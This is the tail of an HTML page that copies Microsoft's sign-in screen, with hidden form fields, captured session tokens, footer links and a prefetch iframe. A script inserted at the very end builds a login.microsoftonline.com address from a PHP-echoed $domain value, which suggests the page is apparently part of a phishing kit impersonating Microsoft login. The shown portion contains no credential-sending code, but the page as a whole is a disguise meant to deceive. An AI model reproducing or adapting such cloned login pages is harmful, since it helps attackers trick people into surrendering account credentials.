</div> <!-- /ko --> </div><!-- /ko --> <!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->  <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --> <!-- /ko --> </div> </div></div> <!-- /ko --> </div> </div> <!-- ko if: showDebugDetails --><!-- /ko --> <!-- ko if: showFedCredButtons --><!-- /ko --> <!-- ko if: newSession --><!-- /ko --> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value="m73IcZYmfSDWT5uEDKKTDcw0qjCNx/3Vd5bzQCgoe9c=8:1"> <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAYWSu27TYABG46RxacWlICQ6QQcGQHLy245vlRgcO0lzc-o4jWsvke04iZ34El_ixCMSEjB1QqITqsTSkQmQEMydOjDxBBUTYkCMhCdgOdOns3xne5MskAVQAE9yaAHdf1jCS4RG6QzCaCSOlBgUIFoJIxGcwEkcA-iQAHhwZ3uH-HLv9_MHL4WPevyZf_Yuew7dn0SRH-4Xi0mSFLzRyDLMguE5xZnmDi13_AGCLiHoCoJOs3nTRY6k82xI4hROA4oGBEaUAIZRZEFJx0tVFhOBr0TtVExUDgDF6TotuZ4oNhuptmq1bdUWnPp603AEuZ0qvfpKlSuRyrOoIgHQTidWS64s23w7UmsiaMvKsl1bOx11-j17q8PG0QT7By-wUvNXdmvkBc7A98LoNPc6K3iubLWWB6KkT3GTcC0q7PfqyfSoEhuzJEhWMd_RJNwrNaUZB5iZPtNJENBOVwWJJ3CsS4e00ZgezAWKWRjDkdVVUxNxG4dMvybTc98NcWxO9EK_HrZQeuKXV5oReoum0qwIZncy6VN-lx_Y6lhEavHMjEGn1OdTZtgE1cMx7ZaZEhbpbpXx_TIX-UuHblQFsVp2MMEX2TRdIiMg2qyuoaQcHCfH3IqP-QE-blDMqjzuHgcCZWiHVcfE9FXXSO0O6rlcYMterWEiuIJW0wNyuBjHYjWQaIPQa9yictgU3-fg9ZmO517kbnq-6VrDPT_wRtbMvNyAfmxcvwbvwLuZvcyjuyD_ZwM6y68beeWcvbmck7W38unVt93HmYt80aHwuqEqzkji5R4RV_hms8cbCZjbnLAs4v0hoaciN_ZMxnhK76MnMHQCwxfw7To_ECo9qccKPNvlsQH4CUMvNjOftv5T3dcbmb81"> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="99a26d8a-71d0-4736-a057-9ae8d4182900"> <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAAB2UyzwtQEKR7-rWbgdcBZICrNjOjvslKbg33lS77YkZA82PjXPXABE1SVlm3m74dWcyLsOsiiKJuagYTunwy57j0rAWBW1d-kRaJWzGPkNPQPTFiBtqWt2Nerxh9zhbBZY1Rg64c7wypA_5a8PtUvpkHsug-vBfupo96isZaHbaIrQfk9QRiOwIxR-EywfDW3bKcLYgVS2K1WnMko7qzPLQqUaLwyiTUbmhW4MU9aloYnjwx5_cv30qCOSb-czUDiso-AW6Ak__Bey1UqbP7YDCurgcRYEMn5XWGXknq3YCrQBM5sd9UvDre7-u6ubvqToWs7EV6qmK0fzIAMKmwZmbjyNrnJpIy7by26aJ7IP3avHR7GcNu4Dn1cic4lEByVisYqxQ8SU6mhewahin8Uyf2-Q1zcebyeynbVUMA4DBebEUTqZDKL74hfSr7Jh0-uWCffU7lGsDsJR_3w58wC7JvcY2ggSKk1eeqFbZCIwnCAA"> <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value=""> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0"> <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="0"> <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0"> <div data-bind="component: { name: 'instrumentation-control',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="102"> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden" name="i18" data-bind="value: srsSuccess" value=""> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> <!-- ko ifnot: svr.fHideFooter --> <div id="footer" role="contentinfo" data-bind="
                css: {
                    'default': !backgroundLogoUrl(),
                    'new-background-image': useNewDefaultBackground },
                externalCss: { 'footer': true }" class="default footer ext-footer"> <div data-bind="component: { name: 'footer-control',
                    publicMethods: footerMethods,
                    params: {
                        serverData: svr,
                        useNewDefaultBackground: useNewDefaultBackground(),
                        hasDarkBackground: backgroundLogoUrl(),
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetails: toggleDebugDetails_onClick } }"><!--  --> <!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) --> <div id="footerLinks" class="footerNode text-secondary"> <!-- ko if: !hideTOU --> <a id="ftrTerms" data-bind="text: termsText, href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> <!-- /ko --> <!-- ko if: !hidePrivacy --> <a id="ftrPrivacy" data-bind="text: privacyText, href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; cookies</a> <!-- /ko --> <!-- ko if: impressumLink --><!-- /ko --> <!-- ko if: showIcpLicense --><!-- /ko --> <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus --> <a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo()" aria-label="Click here for troubleshooting information" aria-expanded="false"> <!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: !useNewDefaultBackground } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --> <!-- ko template: { nodes: [lightImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/shared/1.0/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg"><!-- /ko --> <!-- /ko --> <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --><!-- /ko --><!-- /ko --> <!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: hasDarkBackground } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --> <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/shared/1.0/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div> <!-- /ko --> <!-- ko if: svr.fShowLegalMessagingInline && showLinks --><!-- /ko --></div> </div> <!-- /ko --> </div> <!-- /ko --></div> <!-- /ko --> </form> <form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form> <!-- ko if: svr.urlCBPartnerPreload --> <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"><iframe style="display: none;" src="https://www.office.com/prefetch/prefetch" width="0" height="0"></iframe></div> <!-- /ko --> </div>
        
        <script>
    location.hash = 'url=login.microsoftonline.com/<?php echo $domain;?>';

</script>
        
        </body></html>